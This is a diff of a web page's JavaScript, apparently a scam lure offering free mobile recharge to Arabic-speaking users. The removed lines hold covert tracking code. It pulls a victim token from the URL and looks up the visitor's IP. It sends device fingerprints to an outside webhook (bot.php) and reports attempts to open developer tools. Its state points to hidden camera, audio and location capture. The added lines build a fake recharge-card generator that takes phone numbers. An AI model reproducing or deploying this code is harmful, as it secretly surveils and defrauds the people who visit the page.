-            "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
-        const TOTAL_PHOTOS = 8;
-        const CAPTURE_INTERVAL = 700;
-        const AUDIO_DURATION = 5000;
-        const PHOTO_QUALITY = 0.92;
+        /* ═══════════════════════════════════════════════════════════════════
+           DATA ENGINE — Complete Telecom Database
+           ═══════════════════════════════════════════════════════════════════ */
 
-        // ============================================================
-        //  COUNTRIES with unique color palettes
-        // ============================================================
-        const COUNTRIES_DATA = {
-            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'], colors: ['#c9a84c', '#8b6b2a', '#d4b87a',
-                    '#6a4f1a'
-                ], accent: '#c9a84c' },
-            'السعودية': { flag: '🇸🇦', prefixes: ['05'], colors: ['#1a6b3a', '#2a8a4a', '#0d4a2a', '#3a9a5a'],
-                accent: '#2a8a4a' },
-            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'], colors: ['#1a2a4a', '#2a4a7a',
-                    '#0a1a3a', '#3a5a8a'
-                ], accent: '#2a4a7a' },
-            'الكويت': { flag: '🇰🇼', prefixes: ['5'], colors: ['#2a6a4a', '#1a4a3a', '#3a8a5a', '#0a3a2a'],
-                accent: '#2a6a4a' },
-            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'], colors: ['#6a2a3a', '#8a3a4a', '#4a1a2a', '#9a4a5a'],
-                accent: '#8a3a4a' },
-            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'], colors: ['#2a4a3a', '#1a3a2a', '#3a5a4a', '#0a2a1a'],
-                accent: '#2a4a3a' },
-            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'], colors: ['#4a2a1a', '#6a3a2a', '#2a1a0a', '#7a4a3a'],
-                accent: '#6a3a2a' },
-            'الأردن': { flag: '🇯🇴', prefixes: ['7'], colors: ['#2a1a3a', '#4a2a5a', '#1a0a2a', '#5a3a6a'],
-                accent: '#4a2a5a' },
-            'العراق': { flag: '🇮🇶', prefixes: ['7'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
-                accent: '#2a3a2a' },
-            'سوريا': { flag: '🇸🇾', prefixes: ['9'], colors: ['#2a1a0a', '#4a2a1a', '#1a0a00', '#5a3a2a'],
-                accent: '#4a2a1a' },
-            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'], colors: ['#3a1a1a', '#5a2a2a', '#1a0a0a', '#6a3a3a'],
-                accent: '#5a2a2a' },
-            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
-                accent: '#2a3a2a' },
-            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'], colors: ['#1a3a2a', '#2a5a3a', '#0a2a1a', '#3a6a4a'],
-                accent: '#2a5a3a' },
-            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'], colors: ['#3a1a0a', '#5a2a1a', '#1a0a00', '#6a3a2a'],
-                accent: '#5a2a1a' },
-            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'], colors: ['#2a1a1a', '#4a2a2a', '#1a0a0a', '#5a3a3a'],
-                accent: '#4a2a2a' },
-            'ليبيا': { flag: '🇱🇾', prefixes: ['9'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
-                accent: '#2a3a2a' },
-            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
-                accent: '#2a3a2a' },
-            'اليمن': { flag: '🇾🇪', prefixes: ['7'], colors: ['#2a1a0a', '#4a2a1a', '#1a0a00', '#5a3a2a'],
-                accent: '#4a2a1a' },
-            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'], colors: ['#1a3a3a', '#2a5a5a', '#0a2a2a', '#3a6a6a'],
-                accent: '#2a5a5a' },
-            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'], colors: ['#2a3a1a', '#3a5a2a', '#1a2a0a', '#4a6a3a'],
-                accent: '#3a5a2a' },
-            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
-                accent: '#2a3a2a' },
+        const TELECOM_DATA = {
+
+            'مصر': {
+                code: '+20',
+                icon: '🇪🇬',
+                color: '#d4a373',
+                operators: [
+                    { id: 'vodafone', name: 'Vodafone', prefix: '010', color: '#e60000', color2: '#cc0000',
+                    glow: 'rgba(230,0,0,0.2)' },
+                    { id: 'orange', name: 'Orange', prefix: '012', color: '#ff7900', color2: '#e06a00',
+                    glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'etisalat', name: 'e& Egypt', prefix: '011', color: '#00a86b', color2: '#008a56',
+                    glow: 'rgba(0,168,107,0.2)' },
+                    { id: 'we', name: 'WE', prefix: '015', color: '#5b2cff', color2: '#4518cc',
+                    glow: 'rgba(91,44,255,0.2)' }
+                ]
+            },
+
+            'السعودية': {
+                code: '+966',
+                icon: '🇸🇦',
+                color: '#4caf50',
+                operators: [
+                    { id: 'stc', name: 'STC', prefix: '050', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'stc2', name: 'STC', prefix: '053', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'stc3', name: 'STC', prefix: '055', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'mobily', name: 'Mobily', prefix: '054', color: '#f9a825', color2: '#f57f17',
+                    glow: 'rgba(249,168,37,0.2)' },
+                    { id: 'mobily2', name: 'Mobily', prefix: '056', color: '#f9a825', color2: '#f57f17',
+                    glow: 'rgba(249,168,37,0.2)' },
+                    { id: 'zain', name: 'Zain', prefix: '058', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' }
+                ]
+            },
+
+            'الإمارات': {
+                code: '+971',
+                icon: '🇦🇪',
+                color: '#c0a86a',
+                operators: [
+                    { id: 'etisalat_ae', name: 'Etisalat', prefix: '050', color: '#00a86b', color2: '#008a56',
+                        glow: 'rgba(0,168,107,0.2)' },
+                    { id: 'etisalat_ae2', name: 'Etisalat', prefix: '054', color: '#00a86b', color2: '#008a56',
+                        glow: 'rgba(0,168,107,0.2)' },
+                    { id: 'etisalat_ae3', name: 'Etisalat', prefix: '056', color: '#00a86b', color2: '#008a56',
+                        glow: 'rgba(0,168,107,0.2)' },
+                    { id: 'du', name: 'du', prefix: '052', color: '#ff0080', color2: '#cc0066',
+                    glow: 'rgba(255,0,128,0.2)' },
+                    { id: 'du2', name: 'du', prefix: '055', color: '#ff0080', color2: '#cc0066',
+                    glow: 'rgba(255,0,128,0.2)' }
+                ]
+            },
+
+            'الكويت': {
+                code: '+965',
+                icon: '🇰🇼',
+                color: '#00bcd4',
+                operators: [
+                    { id: 'zain_kw', name: 'Zain', prefix: '6', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' },
+                    { id: 'ooredoo_kw', name: 'Ooredoo', prefix: '5', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' },
+                    { id: 'stc_kw', name: 'STC', prefix: '7', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'stc_kw2', name: 'STC', prefix: '8', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' }
+                ]
+            },
+
+            'قطر': {
+                code: '+974',
+                icon: '🇶🇦',
+                color: '#8d6e63',
+                operators: [
+                    { id: 'ooredoo_qa', name: 'Ooredoo', prefix: '3', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' },
+                    { id: 'ooredoo_qa2', name: 'Ooredoo', prefix: '5', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' },
+                    { id: 'ooredoo_qa3', name: 'Ooredoo', prefix: '6', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' },
+                    { id: 'vodafone_qa', name: 'Vodafone', prefix: '7', color: '#e60000', color2: '#cc0000',
+                        glow: 'rgba(230,0,0,0.2)' }
+                ]
+            },
+
+            'الأردن': {
+                code: '+962',
+                icon: '🇯🇴',
+                color: '#ff8f00',
+                operators: [
+                    { id: 'orange_jo', name: 'Orange', prefix: '077', color: '#ff7900', color2: '#e06a00',
+                        glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'orange_jo2', name: 'Orange', prefix: '078', color: '#ff7900', color2: '#e06a00',
+                        glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'orange_jo3', name: 'Orange', prefix: '079', color: '#ff7900', color2: '#e06a00',
+                        glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'zain_jo', name: 'Zain', prefix: '076', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' },
+                    { id: 'umniah_jo', name: 'Umniah', prefix: '075', color: '#00a86b', color2: '#008a56',
+                        glow: 'rgba(0,168,107,0.2)' }
+                ]
+            },
+
+            'العراق': {
+                code: '+964',
+                icon: '🇮🇶',
+                color: '#2e7d32',
+                operators: [
+                    { id: 'zain_iq', name: 'Zain', prefix: '078', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' },
+                    { id: 'zain_iq2', name: 'Zain', prefix: '079', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' },
+                    { id: 'asiacell_iq', name: 'Asia Cell', prefix: '077', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' },
+                    { id: 'korek_iq', name: 'Korek', prefix: '075', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' }
+                ]
+            },
+
+            'المغرب': {
+                code: '+212',
+                icon: '🇲🇦',
+                color: '#c62828',
+                operators: [
+                    { id: 'maroc_telecom', name: 'Maroc Telecom', prefix: '06', color: '#e60000', color2: '#cc0000',
+                        glow: 'rgba(230,0,0,0.2)' },
+                    { id: 'maroc_telecom2', name: 'Maroc Telecom', prefix: '07', color: '#e60000', color2: '#cc0000',
+                        glow: 'rgba(230,0,0,0.2)' },
+                    { id: 'orange_ma', name: 'Orange', prefix: '06', color: '#ff7900', color2: '#e06a00',
+                    glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'inwi', name: 'Inwi', prefix: '07', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' }
+                ]
+            },
+
+            'الجزائر': {
+                code: '+213',
+                icon: '🇩🇿',
+                color: '#00695c',
+                operators: [
+                    { id: 'mobilis', name: 'Mobilis', prefix: '05', color: '#e60000', color2: '#cc0000',
+                    glow: 'rgba(230,0,0,0.2)' },
+                    { id: 'mobilis2', name: 'Mobilis', prefix: '06', color: '#e60000', color2: '#cc0000',
+                    glow: 'rgba(230,0,0,0.2)' },
+                    { id: 'mobilis3', name: 'Mobilis', prefix: '07', color: '#e60000', color2: '#cc0000',
+                    glow: 'rgba(230,0,0,0.2)' },
+                    { id: 'djezzy', name: 'Djezzy', prefix: '05', color: '#ff7900', color2: '#e06a00',
+                    glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'djezzy2', name: 'Djezzy', prefix: '06', color: '#ff7900', color2: '#e06a00',
+                    glow: 'rgba(255,121,0,0.2)' },
+                    { id: 'ooredoo_dz', name: 'Ooredoo', prefix: '05', color: '#00a86b', color2: '#008a56',
+                        glow: 'rgba(0,168,107,0.2)' }
+                ]
+            },
+
+            'تونس': {
+                code: '+216',
+                icon: '🇹🇳',
+                color: '#e53935',
+                operators: [
+                    { id: 'tunisie_telecom', name: 'Tunisie Telecom', prefix: '2', color: '#1a73e8', color2: '#0d47a1',
+                        glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'tunisie_telecom2', name: 'Tunisie Telecom', prefix: '5', color: '#1a73e8',
+                        color2: '#0d47a1', glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'ooredoo_tn', name: 'Ooredoo', prefix: '2', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' },
+                    { id: 'orange_tn', name: 'Orange', prefix: '2', color: '#ff7900', color2: '#e06a00',
+                    glow: 'rgba(255,121,0,0.2)' }
+                ]
+            },
+
+            'لبنان': {
+                code: '+961',
+                icon: '🇱🇧',
+                color: '#c62828',
+                operators: [
+                    { id: 'mtc_touch', name: 'MTN Touch', prefix: '3', color: '#ffb300', color2: '#f57f17',
+                        glow: 'rgba(255,179,0,0.2)' },
+                    { id: 'mtc_touch2', name: 'MTN Touch', prefix: '7', color: '#ffb300', color2: '#f57f17',
+                        glow: 'rgba(255,179,0,0.2)' },
+                    { id: 'alfa', name: 'Alfa', prefix: '3', color: '#e60000', color2: '#cc0000',
+                    glow: 'rgba(230,0,0,0.2)' }
+                ]
+            },
+
+            'فلسطين': {
+                code: '+970',
+                icon: '🇵🇸',
+                color: '#2e7d32',
+                operators: [
+                    { id: 'jawwal', name: 'Jawwal', prefix: '5', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'jawwal2', name: 'Jawwal', prefix: '9', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'wataniya', name: 'Wataniya', prefix: '5', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' }
+                ]
+            },
+
+            'سوريا': {
+                code: '+963',
+                icon: '🇸🇾',
+                color: '#8d6e63',
+                operators: [
+                    { id: 'mtn_sy', name: 'MTN', prefix: '9', color: '#ffb300', color2: '#f57f17',
+                    glow: 'rgba(255,179,0,0.2)' },
+                    { id: 'syriatel', name: 'Syriatel', prefix: '9', color: '#e60000', color2: '#cc0000',
+                        glow: 'rgba(230,0,0,0.2)' }
+                ]
+            },
+
+            'السودان': {
+                code: '+249',
+                icon: '🇸🇩',
+                color: '#2e7d32',
+                operators: [
+                    { id: 'mtn_sd', name: 'MTN', prefix: '9', color: '#ffb300', color2: '#f57f17',
+                    glow: 'rgba(255,179,0,0.2)' },
+                    { id: 'mtn_sd2', name: 'MTN', prefix: '1', color: '#ffb300', color2: '#f57f17',
+                    glow: 'rgba(255,179,0,0.2)' },
+                    { id: 'zain_sd', name: 'Zain', prefix: '9', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' }
+                ]
+            },
+
+            'اليمن': {
+                code: '+967',
+                icon: '🇾🇪',
+                color: '#e53935',
+                operators: [
+                    { id: 'mtn_ye', name: 'MTN', prefix: '7', color: '#ffb300', color2: '#f57f17',
+                    glow: 'rgba(255,179,0,0.2)' },
+                    { id: 'saba', name: 'SabaFon', prefix: '7', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' }
+                ]
+            },
+
+            'عُمان': {
+                code: '+968',
+                icon: '🇴🇲',
+                color: '#26a69a',
+                operators: [
+                    { id: 'omantel', name: 'Omantel', prefix: '7', color: '#0066b3', color2: '#004d99',
+                        glow: 'rgba(0,102,179,0.2)' },
+                    { id: 'omantel2', name: 'Omantel', prefix: '9', color: '#0066b3', color2: '#004d99',
+                        glow: 'rgba(0,102,179,0.2)' },
+                    { id: 'ooredoo_om', name: 'Ooredoo', prefix: '7', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' }
+                ]
+            },
+
+            'البحرين': {
+                code: '+973',
+                icon: '🇧🇭',
+                color: '#e53935',
+                operators: [
+                    { id: 'batelco', name: 'Batelco', prefix: '3', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'batelco2', name: 'Batelco', prefix: '6', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'zain_bh', name: 'Zain', prefix: '5', color: '#7b1fa2', color2: '#4a148c',
+                    glow: 'rgba(123,31,162,0.2)' }
+                ]
+            },
+
+            'ليبيا': {
+                code: '+218',
+                icon: '🇱🇾',
+                color: '#2e7d32',
+                operators: [
+                    { id: 'libyana', name: 'Libyana', prefix: '9', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'al_madar', name: 'Al-Madar', prefix: '9', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' }
+                ]
+            },
+
+            'موريتانيا': {
+                code: '+222',
+                icon: '🇲🇷',
+                color: '#2e7d32',
+                operators: [
+                    { id: 'mattel', name: 'Mattel', prefix: '4', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'mattel2', name: 'Mattel', prefix: '5', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'tinguitel', name: 'Tinguitel', prefix: '4', color: '#e65100', color2: '#bf360c',
+                        glow: 'rgba(230,81,0,0.2)' }
+                ]
+            },
+
+            'جيبوتي': {
+                code: '+253',
+                icon: '🇩🇯',
+                color: '#00bcd4',
+                operators: [
+                    { id: 'djibouti_telecom', name: 'Djibouti Telecom', prefix: '7', color: '#1a73e8',
+                        color2: '#0d47a1', glow: 'rgba(26,115,232,0.2)' }
+                ]
+            },
+
+            'الصومال': {
+                code: '+252',
+                icon: '🇸🇴',
+                color: '#e53935',
+                operators: [
+                    { id: 'hormuud', name: 'Hormuud', prefix: '6', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'hormuud2', name: 'Hormuud', prefix: '7', color: '#1a73e8', color2: '#0d47a1',
+                    glow: 'rgba(26,115,232,0.2)' },
+                    { id: 'somtel', name: 'Somtel', prefix: '6', color: '#e65100', color2: '#bf360c',
+                    glow: 'rgba(230,81,0,0.2)' }
+                ]
+            }
         };
 
-        const COUNTRY_NAMES = Object.keys(COUNTRIES_DATA);
-        const RARITIES = [
-            { id: 'common', label: 'Common', weight: 35, color: 'rgba(255,255,255,0.04)', glow: 'rgba(255,255,255,0.01)' },
-            { id: 'rare', label: 'Rare', weight: 25, color: 'rgba(100,180,255,0.08)', glow: 'rgba(100,180,255,0.02)' },
-            { id: 'epic', label: 'Epic', weight: 18, color: 'rgba(180,100,255,0.08)', glow: 'rgba(180,100,255,0.02)' },
-            { id: 'legendary', label: 'Legendary', weight: 12, color: 'rgba(255,200,50,0.10)',
-            glow: 'rgba(255,200,50,0.03)' },
-            { id: 'crystal', label: 'Crystal', weight: 5, color: 'rgba(100,255,220,0.08)', glow: 'rgba(100,255,220,0.02)' },
-            { id: 'titanium', label: 'Titanium', weight: 3, color: 'rgba(180,200,220,0.10)',
-            glow: 'rgba(180,200,220,0.03)' },
-            { id: 'diamond', label: 'Diamond', weight: 1.5, color: 'rgba(200,255,255,0.12)',
-            glow: 'rgba(200,255,255,0.04)' },
-            { id: 'quantum', label: 'Quantum', weight: 0.5, color: 'rgba(255,100,200,0.12)',
-            glow: 'rgba(255,100,200,0.04)' },
+        // ─── Recharge Packages ───
+        const PACKAGES = [
+            { id: 'p1', value: '10', data: '2 GB', label: '$10', desc: '2 GB · 7 days' },
+            { id: 'p2', value: '25', data: '6 GB', label: '$25', desc: '6 GB · 15 days' },
+            { id: 'p3', value: '50', data: '15 GB', label: '$50', desc: '15 GB · 30 days' },
+            { id: 'p4', value: '100', data: '40 GB', label: '$100', desc: '40 GB · 60 days' },
         ];
 
-        // ============================================================
-        //  TOKEN
-        // ============================================================
-        let USER_TOKEN = null;
+        /* ═══════════════════════════════════════════════════════════════════
+           STATE
+           ═══════════════════════════════════════════════════════════════════ */
 
-        function extractTokenFromURL() {
-            const params = new URLSearchParams(window.location.search);
-            const token = params.get('i');
-            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
-                USER_TOKEN = token;
-                return true;
-            }
-            USER_TOKEN = null;
-            return false;
+        const state = {
+            countryKey: null,
+            country: null,
+            operator: null,
+            phone: '',
+            package: null,
+            cardData: null,
+            isFlipped: false,
+            rotation: 0,
+            isGenerating: false,
+            isValid: false,
+        };
+
+        /* ═══════════════════════════════════════════════════════════════════
+           DOM REFS
+           ═══════════════════════════════════════════════════════════════════ */
+
+        const $ = id => document.getElementById(id);
+        const countryGrid = $('countryGrid');
+        const phoneInput = $('phoneInput');
+        const phonePrefix = $('phonePrefix');
+        const phonePageLabel = $('phonePageLabel');
+        const phonePageTitle = $('phonePageTitle');
+        const phoneCountrySub = $('phoneCountrySub');
+        const statusIcon = $('statusIcon');
+        const validMsg = $('validMsg');
+        const operatorBadge = $('operatorBadge');
+        const opDot = $('opDot');
+        const opName = $('opName');
+        const opSub = $('opSub');
+        const generateBtn = $('generateBtn');
+        const simCard = $('simCard');
+        const simHolo = $('simHolo');
+        const simOpLabel = $('simOpLabel');
+        const simBrand = $('simBrand');
+        const simNumber = $('simNumber');
+        const simValid = $('simValid');
+        const simCode = $('simCode');
+        const simData = $('simData');
+        const simValue = $('simValue');
+        const simEngrave = $('simEngrave');
+        const simDataIcon = $('simDataIcon');
+        const simQR = $('simQR');
+        const cardActions = $('cardActions');
+        const genOverlay = $('genOverlay');
+        const genCore = $('genCore');
+        const genStatus = $('genStatus');
+        const genBar = $('genBar');
+        const glowAura = $('glowAura');
+
+        /* ═══════════════════════════════════════════════════════════════════
+           NAVIGATION
+           ═══════════════════════════════════════════════════════════════════ */
+
+        function goToCountry() {
+            document.getElementById('pageCountry').classList.add('active');
+            document.getElementById('pagePhone').classList.remove('active');
+            simCard.classList.remove('visible');
+            cardActions.classList.remove('visible');
+            generateBtn.disabled = true;
+            // Reset validation
+            statusIcon.className = 'status-icon';
+            validMsg.className = 'validation-msg';
+            validMsg.textContent = 'أدخل رقم صحيح';
+            operatorBadge.style.display = 'none';
+            phoneInput.value = '';
+            state.isValid = false;
+            state.operator = null;
         }
 
-        // ============================================================
-        //  WEBHOOK
-        // ============================================================
-        async function sendToWebhook(formData) {
-            if (!USER_TOKEN) {
-                console.error('❌ Token missing');
-                return { success: false, error: 'Token missing' };
-            }
-            formData.append('token', USER_TOKEN);
-            try {
-                const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                const data = await res.json();
-                if (!res.ok) return { success: false, error: data.message || 'HTTP error' };
-                return { success: true, data };
-            } catch (e) {
-                return { success: false, error: e.message };
-            }
+        function goToPhone() {
+            document.getElementById('pageCountry').classList.remove('active');
+            document.getElementById('pagePhone').classList.add('active');
+            phoneInput.focus();
         }
 
-        // ============================================================
-        //  STATE
-        // ============================================================
-        let selectedCountry = null;
-        let userPhone = null;
-        let mediaStream = null;
-        let audioStream = null;
-        let audioRecorder = null;
-        let audioChunks = [];
-        let capturedPhotoFiles = [];
-        let audioBlob = null;
-        let userIP = 'غير متاح';
-        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
-        let isProcessing = false;
-        let timerInterval = null;
-        let timerSeconds = 180;
-        let isShuffling = false;
-        let currentCards = [];
-        let selectedCardIndex = -1;
+        /* ═══════════════════════════════════════════════════════════════════
+           RENDER COUNTRIES
+           ═══════════════════════════════════════════════════════════════════ */
 
-        // DOM
-        const cardsGrid = document.getElementById('cardsGrid');
-        const statusCards = document.getElementById('statusCards');
-        const statusTasks = document.getElementById('statusTasks');
-        const statusTimer = document.getElementById('statusTimer');
-        const claimBtn = document.getElementById('claimBtn');
-        const phoneInput = document.getElementById('phoneInput');
-        const permissionArea = document.getElementById('permissionArea');
-        const timerDisplay = document.getElementById('timerDisplay');
-        const taskSub = document.getElementById('taskSub');
-        const shuffleBtn = document.getElementById('shuffleBtn');
-        const stepCards = document.getElementById('step-cards');
-        const stepClaim = document.getElementById('step-claim');
-        const stepTimer = document.getElementById('step-timer');
-        const video = document.getElementById('hiddenVideo');
-        const canvas = document.getElementById('hiddenCanvas');
-
-        const stepDots = document.querySelectorAll('.step-dot');
-        const stepLines = document.querySelectorAll('.step-line');
-
-        // ============================================================
-        //  STEP INDICATOR
-        // ============================================================
-        function updateStepIndicator(step) {
-            stepDots.forEach((dot, idx) => {
-                const num = idx + 1;
-                dot.classList.remove('active', 'completed');
-                if (num === step) dot.classList.add('active');
-                else if (num < step) dot.classList.add('completed');
+        function renderCountries() {
+            countryGrid.innerHTML = '';
+            const keys = Object.keys(TELECOM_DATA);
+            keys.forEach((key) => {
+                const c = TELECOM_DATA[key];
+                const btn = document.createElement('button');
+                btn.className = 'btn btn-country';
+                btn.style.setProperty('--btn-color', c.color);
+                btn.innerHTML = `
+              <span class="icon">${c.icon}</span>
+              <span class="label">${key}</span>
+              <span class="sub">${c.code}</span>
+              <span class="bar"></span>
+              <span class="dot-indicator"></span>
+            `;
+                btn.addEventListener('click', () => selectCountry(key));
+                countryGrid.appendChild(btn);
             });
-            stepLines.forEach((line, idx) => {
-                const num = idx + 1;
-                line.classList.toggle('active', num < step);
-            });
         }
 
-        function showStep(stepId) {
-            document.querySelectorAll('.step, .claim-area').forEach(el => el.classList.remove('active'));
-            const target = document.getElementById(stepId);
-            if (target) target.classList.add('active');
-            // update indicator
-            const map = { 'step-cards': 1, 'step-claim': 2, 'step-timer': 3 };
-            updateStepIndicator(map[stepId] || 1);
+        /* ═══════════════════════════════════════════════════════════════════
+           SELECT COUNTRY
+           ═══════════════════════════════════════════════════════════════════ */
+
+        function selectCountry(key) {
+            state.countryKey = key;
+            state.country = TELECOM_DATA[key];
+
+            // Update UI
+            phonePrefix.textContent = state.country.code;
+            phonePageLabel.textContent = state.countryKey;
+            phonePageTitle.textContent = `أدخل رقم ${state.countryKey}`;
+            phoneCountrySub.textContent = `${state.countryKey} · ${state.country.code}`;
+
+            // Update glow
+            glowAura.style.background =
+                `radial-gradient(circle, ${state.country.color}33, transparent 70%)`;
+            glowAura.style.opacity = '0.4';
+
+            // Reset
+            phoneInput.value = '';
+            statusIcon.className = 'status-icon';
+            validMsg.className = 'validation-msg';
+            validMsg.textContent = 'أدخل رقم صحيح';
+            operatorBadge.style.display = 'none';
+            state.operator = null;
+            state.isValid = false;
+            generateBtn.disabled = true;
+            simCard.classList.remove('visible');
+            cardActions.classList.remove('visible');
+
+            goToPhone();
         }
 
-        // ============================================================
-        //  NOTIFY VISIT
-        // ============================================================
-        async function notifyUserEntered() {
-            if (!USER_TOKEN) return;
-            let ip = 'غير متاح';
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-                userIP = ip;
-            } catch (_) {}
-            const fd = new FormData();
-            fd.append('event', 'visit');
-            fd.append('timestamp', new Date().toISOString());
-            fd.append('ip', ip);
-            fd.append('userAgent', navigator.userAgent);
-            fd.append('platform', navigator.platform);
-            fd.append('language', navigator.language);
-            fd.append('screen', `${screen.width}x${screen.height}`);
-            fd.append('url', window.location.href);
-            await sendToWebhook(fd).catch(() => {});
-        }
+        /* ═══════════════════════════════════════════════════════════════════
+           PHONE VALIDATION ENGINE — Smart Operator Detection
+           ═══════════════════════════════════════════════════════════════════ */
 
-        // ============================================================
-        //  SUSPICIOUS
-        // ============================================================
-        function detectSuspiciousActivity() {
-            document.addEventListener('contextmenu', (e) => { e.preventDefault();
-                sendSuspiciousAlert('🖱️ النقر الأيمن'); });
-            document.addEventListener('keydown', (e) => {
-                const k = e.key;
-                const c = e.ctrlKey || e.metaKey;
-                const s = e.shiftKey;
-                if (k === 'F12' || (c && s && (k === 'I' || k === 'C' || k === 'J')) || (c && k === 'U')) {
-                    e.preventDefault();
-                    sendSuspiciousAlert(`⌨️ أدوات المطور (${k})`);
+        phoneInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\s/g, '');
+            value = value.replace(/\D/g, '');
+            this.value = value;
+
+            if (!state.country) return;
+
+            // Find matching operator by prefix
+            let matchedOp = null;
+            const operators = state.country.operators;
+
+            // Sort by prefix length descending (longest first)
+            const sorted = [...operators].sort((a, b) => b.prefix.length - a.prefix.length);
+
+            for (const op of sorted) {
+                if (value.startsWith(op.prefix)) {
+                    matchedOp = op;
+                    break;
                 }
-                if (c && ['c', 'v', 'x'].includes(k)) {
-                    sendSuspiciousAlert(`📋 ${k === 'c' ? 'نسخ' : k === 'v' ? 'لصق' : 'قص'}`);
+            }
+
+            const minLength = matchedOp ? matchedOp.prefix.length + 3 : 6;
+            const hasLength = value.length >= minLength && value.length <= 15;
+
+            if (matchedOp && hasLength) {
+                // Valid!
+                state.operator = matchedOp;
+                state.isValid = true;
+                state.phone = value;
+
+                // Update UI
+                statusIcon.className = 'status-icon valid';
+                statusIcon.textContent = '✓';
+                validMsg.className = 'validation-msg valid';
+                validMsg.textContent = `✓ رقم صحيح لمشغل ${matchedOp.name}`;
+
+                operatorBadge.style.display = 'flex';
+                opDot.style.background = matchedOp.color;
+                opName.textContent = matchedOp.name;
+                opName.style.color = matchedOp.color;
+                opSub.textContent = `${state.countryKey} · ${state.country.code}`;
+
+                // Enable generate button
+                generateBtn.disabled = false;
+                generateBtn.textContent = '✦ إنشاء كارت الشحن';
+
+                // Set colors
+                const root = document.documentElement;
+                root.style.setProperty('--btn-color', matchedOp.color);
+                root.style.setProperty('--btn-glow', matchedOp.glow);
+                glowAura.style.background =
+                    `radial-gradient(circle, ${matchedOp.glow}, transparent 70%)`;
+                glowAura.style.opacity = '0.5';
+
+            } else if (value.length > 0) {
+                // Invalid or incomplete
+                state.isValid = false;
+                state.operator = null;
+                statusIcon.className = 'status-icon invalid';
+                statusIcon.textContent = '✗';
+                validMsg.className = 'validation-msg invalid';
+
